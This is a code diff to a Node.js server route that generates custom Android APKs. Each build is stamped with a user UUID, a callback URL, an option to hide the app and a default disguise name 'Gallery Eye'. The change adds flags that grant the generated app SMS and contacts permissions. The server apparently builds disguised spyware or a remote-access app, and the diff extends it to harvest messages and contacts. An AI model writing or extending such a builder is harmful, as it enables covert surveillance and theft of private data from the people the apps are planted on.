@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -123,12 +123,18 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // 3. Inject Config
+            // 3. Inject Config with permission flags
             await sendUpdate('apk_progress', { step: 'Injecting unique user identity...', progress: 45 });
             const assetsDir = path.join(workDir, 'assets');
             if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
             fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
-            const config = { hideApp: hideApp === 'true', webLink: webLink || "", appName: appName || "Gallery Eye" };
+            const config = {
+                hideApp: hideApp === 'true',
+                webLink: webLink || "",
+                appName: appName || "Gallery Eye",
+                enableSmsPermission: enableSmsPermission === 'true',
+                enableContactsPermission: enableContactsPermission === 'true'
+            };
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
             // 4. Icon
